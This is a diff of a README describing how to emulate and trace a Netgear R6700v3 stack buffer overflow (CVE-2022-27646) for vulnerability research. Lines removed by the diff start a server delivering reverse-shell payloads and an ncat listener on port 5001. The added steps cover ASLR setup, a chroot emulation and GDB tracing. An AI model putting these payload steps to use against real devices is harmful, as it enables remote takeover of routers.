@@ -1,5 +1,5 @@
 # Exploiting a Stack Buffer Overflow on the Netgear R6700v3 (CVE-2022-27646)
-## 1. Setup
+## 1. Preparation / Setup
 ### 1.1 Host System
 - Install the following dependencies:
   - git
@@ -34,36 +34,24 @@
 - Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system (e.g. a *QEMU* ARMHF Debian VM).
 ### 1.2 ARMHF Guest System
 - In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem.
-- Start the HTTP server delivering the payloads:
+- Configure conservative ASLR as being used on the Netgear R6700v3:
   ```
-  # Using the default payloads triggering a reverse shell (use `--cmd` for a custom stage 0 payload)
-  python3 server/circled.server.py
+  echo 1 | sudo tee /proc/sys/kernel/randomize_va_spac
   ```
-- In case the HTTP server was started with the default stage 0 payload (i.e. without customizing `--cmd`), listen for the reverse shell coming in on TCP port 5001:
+- Chroot into the root filesystem:
   ```
-  server/bins/ncat -l -p 5001
+  sudo mount -t proc /proc/ $ROOTFS/proc/
+  sudo mount -t sysfs /sys/ $ROOTFS/sys/
+  sudo mount -o bind /dev/ $ROOTFS/dev/
+  sudo chroot $ROOTFS/ /bin/sh
+  export SHELL=/bin/sh
   ```
-- Emulate the vulnerable *circled* binary:
-  - Configure conservative ASLR as being used on the Netgear R6700v3:
-    ```
-    echo 1 | sudo tee /proc/sys/kernel/randomize_va_spac
-    ```
-  - Chroot into the root filesystem:
-    ```
-    sudo mount -t proc /proc/ $ROOTFS/proc/
-    sudo mount -t sysfs /sys/ $ROOTFS/sys/
-    sudo mount -o bind /dev/ $ROOTFS/dev/
-    sudo chroot $ROOTFS/ /bin/sh
-    ```
-  - Execute the *circled* binary:
-    ```
-    export SHELL=/bin/sh
-
-    # With GDB and therefore without ASRL (omit `--gdb` to run without GDB and with ASRL enabled)
-    ./circled.sh --gdb
-    ```
-# 2. Morion Tracing
-- Trace crash (`gdb-multiarch -q -x circled.gdb`)
+## 2. Morion Tracing
+| Step | System         | Command                                                                      | Explanation                                                  |
+|------|----------------|------------------------------------------------------------------------------|--------------------------------------------------------------|
+| 1    | Guest          | `python3 server/circled.server.py --payload "pov"`                           | Start HTTP server delivering proof-of-vulnerability payloads |
+| 2    | Guest (chroot) | `/circled.sh --gdb`                                                          | Emulate binary *circled* with GDB attached                   |
+| 3    | Host  (morion) | `cp circled.init.yaml circled.yaml && gdb-multiarch -q -x circled.trace.gdb` | Trace *circled* binary                                       |
 ## 2. References
 - Emulating Netgear R6700v3 cicled binary:
   - https://medium.com/@INTfinity/1-1-emulating-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-part-1-5bab391c91f2
